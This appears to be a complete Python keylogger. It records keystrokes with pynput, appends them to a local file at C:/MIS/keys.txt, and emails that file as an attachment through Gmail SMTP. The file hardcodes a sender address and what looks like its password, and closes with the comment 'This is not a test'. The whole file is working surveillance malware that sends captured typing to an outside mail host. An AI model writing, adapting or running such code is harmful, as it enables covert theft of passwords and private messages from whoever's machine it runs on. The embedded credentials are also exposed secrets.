from email.mime.text import MIMEText

from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

count = 0
keys = []
log_file = "C:/MIS/keys.txt"


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} has been pressed".format(key))

    if count >= 5:
        count = 0
        parse_input_to_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def parse_input_to_file(keys):
    with open(log_file, "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Email: smtp functionality

email_address = "ngomelikibuba@gmail.com"
password = "KivaNgoMeli-2"

destination_email = "ngomelikibuba@gmail.com"


def send_email(filename, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "Here is an attachment"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open("C:/MIS/keys.txt", 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


send_email(log_file, destination_email)

#This is not a test